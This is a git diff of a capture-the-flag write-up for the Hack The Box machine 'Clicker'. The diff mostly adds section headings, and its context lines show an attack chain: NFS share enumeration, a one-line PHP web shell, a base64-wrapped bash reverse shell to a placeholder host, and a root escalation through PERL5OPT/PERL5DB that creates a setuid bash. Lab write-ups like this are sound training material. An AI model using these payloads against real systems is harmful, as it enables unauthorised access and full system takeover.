@@ -1,5 +1,6 @@
 # Clicker
 
+## Enumeration
 
 ![Homepage](/HTB/Clicker/Screenshots/2023-12-19-10-58-00.png)
 
@@ -12,13 +13,19 @@ export target="<IP>"
 nmap -sC -sV -p- -vv -oN nmap/full $target
 ```
 
+### Nmap
+
 ![Nmap](/HTB/Clicker/Screenshots/2023-12-19-11-27-30.png)
 
 ```rpcbind reveals that nfs is available and supporting older versions.```
 
+### RPC
+
 ![rpcinfo](/HTB/Clicker/Screenshots/2023-12-19-11-13-47.png)
 
 ```Knowing this, mount the share```
+
+### NFS
 
 ![showmounts](/HTB/Clicker/Screenshots/2023-12-19-11-16-36.png)
 
@@ -38,6 +45,8 @@ sudo umount $target:/mnt/backups
 ```
 
 ```We now posess the source code which will help in finding any vulnerabilities.```
+
+## Foothold
 
 ![role](/HTB/Clicker/Screenshots/2023-12-19-11-42-05.png)
 
@@ -79,6 +88,8 @@ sudo umount $target:/mnt/backups
 
 ![Administration content](/HTB/Clicker/Screenshots/2023-12-19-11-59-50.png)
 
+### Exports
+
 ![exports](/HTB/Clicker/Screenshots/2023-12-19-12-02-25.png)
 
 ![php extension specification in data](/HTB/Clicker/Screenshots/2023-12-19-12-33-07.png)
@@ -91,9 +102,13 @@ sudo umount $target:/mnt/backups
 
     <?='$_GET[0]';?>
 
+```This is the shortest php payload, it'll work for our needs, however when referring to the custom exploit we'll use a different one as some of the special symbols collide and are not playing nice```
+
 ![command execution](/HTB/Clicker/Screenshots/2023-12-19-12-23-28.png)
 
 ```Now that we've tested that it's possible, time to get a reverseshell```
+
+### Reverse Shell
 
 ```bash
 echo "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64
@@ -154,7 +169,7 @@ ssh jack@10.10.11.232 -i id_rsa
 
 ![User flag](/HTB/Clicker/Screenshots/2023-12-19-13-19-41.png)
 
-### Escalation to root
+## Escalation to root
 
 ```Check for sudo -l to list all sudo priviledges```
 
@@ -184,7 +199,7 @@ sudo PERL5OPT=-d PERL5DB='exec "cp /bin/bash /tmp/moon/rootbash && chmod u+s /tm
 
 ![euid=root](/HTB/Clicker/Screenshots/2023-12-19-13-41-23.png)
 
-#### flag
+#### Flag
 
 ![rootflag](/HTB/Clicker/Screenshots/2023-12-19-13-42-16.png)
 
